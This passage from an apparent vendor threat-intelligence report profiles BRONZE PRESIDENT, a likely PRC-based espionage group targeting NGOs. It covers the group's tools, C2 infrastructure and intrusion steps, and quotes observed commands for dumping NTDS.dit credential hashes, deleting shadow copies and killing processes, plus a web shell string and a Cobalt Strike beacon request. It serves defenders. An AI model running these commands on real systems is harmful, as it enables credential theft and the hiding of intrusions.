As a result,\nthese organizations are often exposed to increased government-directed threats aimed at\nmonitoring their activities, discrediting their work, or stealing their intellectual property. BRONZE\nPRESIDENT is a likely People's Republic of China (PRC)-based targeted cyberespionage group\nthat uses both proprietary and publicly available tools to target NGO networks. Secureworks®\nCounter Threat Unit™ (CTU) researchers have observed BRONZE PRESIDENT activity since\nmid-2018 but identified artifacts suggesting that the threat actors may have been conducting\nnetwork intrusions as far back as 2014.\n\n[CTU™ researchers divided the threat intelligence about this threat group into two sections:](https://www.gartner.com/en/documents/2487216/)\nstrategic and tactical. Executives can use the strategic assessment of the ongoing threat to\ndetermine how to reduce risk to their organization's mission and critical assets. Computer network\ndefenders can use the tactical information gathered from incident response investigations and\nresearch to reduce the time and effort associated with responding to the threat group's activities.\n\n## Key points\n\nThe BRONZE PRESIDENT cyberespionage group targets NGOs, as well as political and\nlaw enforcement organizations in countries in South and East Asia.\nThe threat group appears to have developed its own remote access tools that it uses\nalongside publicly available remote access and post-compromise toolsets.\nAfter compromising a network, the threat actors elevate their privileges and install malware\non a large proportion of systems. The group runs custom batch scripts to collect specific file\ntypes and takes proactive steps to minimize detection of its activities.\n\n## Strategic threat intelligence\n\nAnalysis of a threat group's targeting, origin, and competencies can determine which\norganizations could be at risk. This information can help organizations make strategic defensive\ndecisions in relation to the BRONZE PRESIDENT threat group.\n\n### Intent\n\nCTU researchers have observed BRONZE PRESIDENT targeting multiple NGOs. The threat\nactors steal data from compromised systems over a long period of time, which likely indicates a\nlong-term objective of monitoring the target's network. BRONZE PRESIDENT uses custom batch\nscripts to collect either specific file types (including files with .pptx, .xlsx, .pdf extensions) or all\n\n\n-----\n\nfiles within a specific location. CTU researchers also observed evidence that the threat actors\ncollect credentials from high-privilege network accounts and reputationally sensitive accounts,\nsuch as social media and webmail accounts.\n\nAdditionally, CTU researchers have observed evidence of BRONZE PRESIDENT targeting\npolitical and law enforcement organizations in countries adjacent to the PRC, including Mongolia\nand India. Some of the group's phishing lures suggest an interest in national security,\nhumanitarian, and law enforcement organizations in the East, South, and Southeast Asia (see\nFigure 1). These examples reveal BRONZE PRESIDENT's likely intent to conduct political\nespionage in other countries in addition to targeting NGOs.\n\n_Figure 1. August 2019 phishing lure referencing Mongolian national security topics. (Source:_\n_Secureworks)_\n\n### Attribution\n\nIt is highly likely that BRONZE PRESIDENT is based in the PRC due to the following\nobservations:\n\n\n-----\n\nThe NGOs targeted by BRONZE PRESIDENT conduct research on issues relevant to the\nPRC.\nStrong evidence links BRONZE PRESIDENT's infrastructure to entities within the PRC.\nThere are connections between a subset of the group's operational infrastructure and PRCbased Internet service providers.\nTools such as PlugX have historically been leveraged by threat groups operating in the\nPRC.\n\nIt is likely that BRONZE PRESIDENT is sponsored or at least tolerated by the PRC government.\nThe threat group's systemic long-term targeting of NGO and political networks does not align with\npatriotic or criminal threat groups.\n\n### Capability\n\nBRONZE PRESIDENT has deployed a variety of remote access tools. The use of tools not\npreviously observed by CTU researchers suggests that the group could have access to malware\ndevelopment capabilities. BRONZE PRESIDENT also uses widely available or modified opensource tools, which could be a strategic effort to reduce the risk of attribution or to minimize the\nneed for tool development resources. Following a network compromise, the threat actors typically\ndelete their tools and processes. However, the group is content leaving some malware on the\nnetwork, likely to provide a contingency if other access channels are removed. When the group's\nactivities were detected in one incident, it had elevated privileges and had maintained access to\nthe targeted environment for several months. This finding indicates the group's effectiveness at\nmaintaining long-term access to a targeted network.\n\n## Tactical threat intelligence\n\nIncident response engagements have given CTU researchers insight into the threat group's tools\nand tactics.\n\n### Tools\n\nCTU researchers and Secureworks incident responders have observed BRONZE PRESIDENT\nusing the following tools, along with several custom batch scripts for locating and archiving\nspecific file types:\n\nCobalt Strike — This popular and commercially available penetration tool gains shell\naccess to an infected system. It allows threat actors to execute additional tools and perform\npost-intrusion actions on compromised systems. Cobalt Strike appears to be one of\nBRONZE PRESIDENT's preferred remote access tools. During one intrusion, the threat\nactors installed it on over 70% of accessible hosts. The group's Cobalt Strike installation\ntypically uses a payload named svchost.exe in an attempt to disguise Cobalt Strike activity\nas the legitimate Windows svchost.exe executable.\n\n\n-----\n\nPlugX — This remote access trojan (RAT) is popular among PRC-based targeted threat\ngroups. Its functionality includes uploading and downloading files, and it has configurable\nnetwork protocols. BRONZE PRESIDENT installs PlugX using DLL side-loading. In June\nand August 2019, BRONZE PRESIDENT delivered PlugX via government and law\n[enforcement-themed phishing lures.](https://twitter.com/h4ckak/status/1163328926573137922?s=19)\nORat — CTU researchers have only observed this basic loader tool in the context of\nBRONZE PRESIDENT intrusions. ORat is the name assigned by the malware author, as\ndenoted by the program debug database string in the analyzed sample:\nD:\\vswork\\Plugin\\ORat\\build\\Release\\ORatServer\\Loader.pdb. The tool uses the Windows\nManagement Instrumentation (WMI) event consumer for persistence by installing a script to\nthe system's WMI registry. Messages sent from ORat to its command and control (C2)\nserver start with the string \"VIEWS0018x\". If the data received from the C2 server starts\nwith the same string, then the remainder of the payload is decompressed using ORat's\n\"deflate\" algorithm and called as a function. ORat acts as a flexible loader tool rather than a\nfully featured remote access tool.\nRCSession — This basic RAT is installed via DLL side-loading, and CTU researchers\nobserved BRONZE PRESIDENT installing it on multiple hosts during intrusions. RCSession\n[was extracted from a file called English.rtf and launched via a hollowed svchost.exe](https://attack.mitre.org/techniques/T1093/)\nprocess. RCSession connects to its C2 server via a custom protocol, can remotely execute\ncommands, and can launch additional tools. CTU researchers have no evidence of other\nthreat actors using RCSession or of wide proliferation of the tool, suggesting it may be\nexclusively used by BRONZE PRESIDENT.\nNbtscan — This publicly available command-line tool scans systems for NetBIOS name\ninformation (see Figure 2). In an example observed by CTU researchers, the Nbtscan\nexecutable was named Adobe.exe and was installed in several working directories on\ncompromised hosts, including: C:\\Recovery\\.\n\n_Figure 2. Nbtscan being used via RCSession to scan an internal IP range. (Source:_\n_Secureworks)_\nNmap — BRONZE PRESIDENT used this freely available network scanning tool from the\nC:\\PerfLogs\\ folder.\n[Wmiexec — This publicly available tool uses WMI to create SYSTEM-level shells on](https://github.com/Twi1ight/AD-Pentest-Script/blob/master/wmiexec.vbs)\nremote hosts.\n\n#### Links to other malware\n\nWhile analyzing hosts compromised by BRONZE PRESIDENT, CTU researchers identified other\nmalware artifacts. Although there was no evidence of the group using the malware, the threat\nactors may have leveraged its access or capabilities during earlier phases of the intrusions. The\n\n\n-----\n\nBRONZE PRESIDENT intrusions observed by CTU researchers appear to have taken place over\nseveral months or years.\n\nChina Chopper web shell files named error404.aspx included the\n\"eval(Request.Item[\"|\"],\"unsafe\");\" string. To successfully interact with the web shell, a threat actor\nsent HTTP requests that included the \"|\" parameter. The web shell files appeared to be installed\nduring the timeframe that BRONZE PRESIDENT was active on the system (see Figure 3).\n\n_Figure 3. Timeline of malicious tool use on a compromised host. (Source: Secureworks)_\n\nCTU researchers identified a variety of post-compromise tools stored under %AppData% (e.g.,\n\\AppData\\Roaming\\Temp) on several compromised systems. The widespread proliferation and\nuse of the following tools suggest that the group likely has the knowledge and capability to use\nthem as part of its operations:\n\n[Powerview.ps1 — This PowerShell-based module for network reconnaissance is part of the](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1)\n[PowerSploit penetration testing framework.](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)\n[PVE Find AD User — This command-line tool identifies login locations of Active Directory](https://www.corelan.be/index.php/2009/07/12/free-tool-find-where-ad-users-are-logged-on-into/)\n(AD) users.\n[AdFind — This command-line tool conducts AD queries.](http://www.joeware.net/freetools/tools/adfind/)\n[NetSess — This publicly available tool enumerates NetBIOS sessions.](http://www.joeware.net/freetools/tools/netsess/)\n[Netview — This tool enumerates networks.](https://github.com/mubix/netview)\n[TeamViewer — This remote control and desktop-sharing tool has applications for legitimate](https://www.teamviewer.com/)\nand malicious system users. Its installation in a temporary directory alongside network\nreconnaissance and enumeration tools likely indicates malicious intent.\n\n### Initial access and working directories\n\nAt the time of detection, observed BRONZE PRESIDENT incidents had likely been ongoing for\nseveral months or even years. As a result, CTU researchers were unable to ascertain the initial\n[access vector. In October 2019, third-party researchers described a phishing campaign that used](https://www.anomali.com/blog/china-based-apt-mustang-panda-targets-minority-groups-public-and-private-sector-organizations)\n\n\n-----\n\nC2 infrastructure that CTU researchers attribute to BRONZE PRESIDENT. This connection\nsuggests that the group uses phishing emails with ZIP attachments that contain LNK files as an\ninitial access vector.\n\nDuring one intrusion, the threat actors gained administrator access to all systems within a\ntargeted business unit and installed their remote access tools on 80% of the hosts. The group\ninstalled multiple tools within the environment, including three different tools on a strategically\nimportant server, likely to provide contingency access options (see Table 1).\n\n##### HOST Cobalt Strike RCSession ORat\n\n Host 1 (Server) X X X\n\n Host 2 (User PC) X\n\n Host 3 (User PC) X X\n\n Host 4 (User PC) X\n\n Host 5 (User PC) X\n\n Host 6 (User PC) X X\n\n Host 7 (User PC) X\n\n_Table 1.

For example, they used Nmap to scan various internal IP address\nranges and SMB ports (see Figure 4). They also relied on Nbtscan, net user, and ping commands\nto obtain insights and identify opportunities for lateral movement.\n\n_Figure 4. Nmap network scanning tool use via RCSession. (Source: Secureworks)_\n\nBRONZE PRESIDENT regularly leverages Wmiexec to move laterally. During one intrusion, the\nthreat actors extensively used this tool to execute WMI commands on remote hosts in the\nenvironment (see Figure 5).\n\n_Figure 5. Wmiexec used to execute commands on a targeted host. (Source: Secureworks)_\n\nThey also frequently leverage net commands to connect to other hosts (see Figure 6) using\ncompromised credentials collected during early phases of the intrusion.\n\n_Figure 6. BRONZE PRESIDENT Nbtscan use and net commands. (Source: Secureworks)_\n\nDuring one intrusion observed by CTU researchers, the group used the native vssadmin tool on a\ndomain controller to create a volume shadow copy:\n\nvssadmin create shadow /for=c:\n\nThe threat actors retrieved the NTDS.dit file from the volume shadow copy. NTDS.dit contains\nActive Directory data, including password hashes for all users on a domain. Extracting hashes\nfrom the NTDS.dit file requires access to the SYSTEM file in the system registry:\n\nreg save hklm\\system c:\\windows\\temp\\system.hive\n\n\n-----\n\nThe threat actors saved both the SYSTEM file (system.hive) and NTDS.dit in the compromised\nhost's c:\\windows\\temp directory. These files were likely exfiltrated and exploited offline to retrieve\nuser password hashes, which could then be cracked or used to perform pass-the-hash attacks.\n\n### C2 communications and infrastructure\n\nBRONZE PRESIDENT's C2 techniques are dictated by its remote access tools. The group's\nprimary and likely proprietary RCSession RAT communicates with a hard-coded C2 server using\na custom protocol over TCP port 443. After connecting to its C2 server, RCSession checks in with\nan encrypted beacon and then awaits instruction. The ORat tool, which appears to be used less\nfrequently by the group, communicates over TCP port 80 using a raw socket protocol (not HTTP).\n\nThe Cobalt Strike tool has malleable C2 profiles. During one intrusion, it connected to multiple C2\ndomains on TCP port 80, including mail . svrchost . com, using the following request. Subsequent\nCobalt Strike C2 servers included subdomains of svchosts . com, svrchost . com, and strust .\nclub.\n\nGET /Dv9i HTTP/1.1\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)\nHost: mail . svrchost . com\nConnection: Keep-Alive\nCache-Control: no-cache\n\nSome BRONZE PRESIDENT C2 domains analyzed by CTU researchers were hosted on\ninfrastructure owned by Dutch VPS provider Host Sailor, Hong Kong-based New World Telecoms,\nand Malaysia-based Shinjiru Technology (see Figure 7). The threat actors have used discrete\ninfrastructure clusters that share matching hosting and registration characteristics. The pattern of\ninfrastructure hosting suggests that the group parks its domains when not in use, an operational\nsecurity technique that limits exposure of the group's overall hosting infrastructure.\n\n_Figure 7. Hosting for a subset of BRONZE PRESIDENT C2 domains. (Source: Secureworks)_\n\n\n-----\n\n### Persistence, defensive evasion, and exfiltration\n\nSome of BRONZE PRESIDENT's malware has persistence capabilities. For example, ORat uses\na WMI event consumer to maintain its presence on a compromised host. The group also creates\nand maintains scheduled tasks to achieve this purpose. Figure 8 shows a Sysdriver scheduled\ntask that periodically executes a Cobalt Strike payload.\n\n_Figure 8. BRONZE PRESIDENT scheduled task created for Cobalt Strike persistence. (Source:_\n_Secureworks)_\n\nThe threat actors tend to install malware on a large proportion of hosts during their intrusions.\nHowever, the group exercises restraint and defensive evasion tactics to minimize opportunities for\nnetwork defenders to detect or investigate its activities. For example, the threat actors deleted\nvolume shadow copies after using them for NTDS.dit retrieval:\n\nvssadmin delete shadows /for=c: /quiet\n\nLikewise, the group demonstrated diligence by killing local and remote processes after they had\nbeen used:\n\ntaskkill /im svchosts.exe /F\n\ntaskkill /S <REMOTE SYSTEM NAME> /U <USERNAME> /P <PASSWORD> /im svchost.exe\n\nBRONZE PRESIDENT targets specific data types. The threat actors use custom batch scripts to\ncreate a list of files with predefined criteria and collate the identified files into a .rar archive (see\nFigure 9). CTU researchers have observed BRONZE PRESIDENT batch scripts named doc.bat,\nxls.bat, xlsx.bat, ppt.bat, pptx.bat, pdf.bat, and txt.bat.\n\n\n-----\n\n_Figure 9. Batch script (pptx.bat) used to collate and archive all .pptx files in a defined location._\n_(Source: Secureworks)_\n\nThe group also uses the all.bat batch script to collect all files stored on a specific user's desktop.\nCTU researchers observed RCSession and Cobalt Strike on systems that BRONZE PRESIDENT\ntargeted for data theft. Either of these tools could have been used to exfiltrate the archived data.\n\n## Conclusion\n\nBRONZE PRESIDENT has demonstrated intent to steal data from organizations using tools such\nas Cobalt Strike, PlugX, ORat, and RCSession. The concurrent use of so many tools during a\nsingle intrusion suggests that the group could include threat actors with distinct tactics, roles, and\ntool preferences. It is likely that BRONZE PRESIDENT has additional unobserved operational\ntools and capabilities. CTU researchers recommend that organizations apply controls to mitigate\ncommon intrusion techniques and behaviors along with controls that address the tools and\ntechniques discussed in this analysis.\n\n## Threat indicators\n\nThe threat indicators in Table 3 are associated with BRONZE PRESIDENT threat campaigns.\nNote that IP addresses can be reallocated.
